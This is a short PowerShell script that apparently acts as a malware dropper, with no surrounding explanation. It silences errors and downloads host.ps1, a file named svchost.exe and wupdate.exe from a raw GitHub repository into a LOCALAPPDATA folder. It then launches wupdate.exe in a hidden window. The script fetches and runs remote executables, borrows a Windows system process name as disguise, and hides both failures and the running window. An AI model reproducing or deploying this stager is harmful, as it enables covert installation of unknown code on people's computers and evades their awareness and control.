
$ErrorActionPreference = "SilentlyContinue"

$repoBase = "https://raw.githubusercontent.com/westoakstudios/LUU/main"
$files = @(
    @{ Name = "host.ps1";     Url = "$repoBase/host.ps1" }
    @{ Name = "svchost.exe";  Url = "$repoBase/svchost.exe" }
    @{ Name = "wupdate.exe";  Url = "$repoBase/wupdate.exe" }
)

$targetDir = Join-Path $env:LOCALAPPDATA "LUU"
if (-not (Test-Path -LiteralPath $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

foreach ($f in $files) {
    $dest = Join-Path $targetDir $f.Name
    try {
        Invoke-WebRequest -Uri $f.Url -OutFile $dest -UseBasicParsing
    } catch { }
}

$launcher = Join-Path $targetDir "wupdate.exe"
if (Test-Path -LiteralPath $launcher) {
    Start-Process -FilePath $launcher -WorkingDirectory $targetDir -WindowStyle Hidden
}